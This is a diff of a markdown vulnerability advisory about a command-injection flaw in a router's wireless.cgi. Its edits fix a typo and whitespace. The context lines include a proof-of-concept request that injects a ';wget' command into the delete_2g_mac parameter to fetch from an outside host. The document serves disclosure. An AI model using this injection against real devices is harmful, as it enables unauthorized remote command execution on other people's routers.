@@ -13,7 +13,7 @@ Type:Remote Command Execution
 
 ## Descriptions
 
-We found an Command Injection vulnerability  in `wireless.cgi` , allows remote attackers to execute arbitrary OS commands from a crafted request:
+We found a Command Injection vulnerability  in `wireless.cgi` , allows remote attackers to execute arbitrary OS commands from a crafted request:
 
 In  ftext function,the router compare the `page` parameter.
 
@@ -52,5 +52,6 @@ page=Delete_Mac_list&delete_list=&delete_2g_mac=;wget 192.168.6.1:6666/testpoc
 ```
 
 <div  align="center"><img src="./img/poc1.png" style="zoom:80%;" /></div>
+
 
 
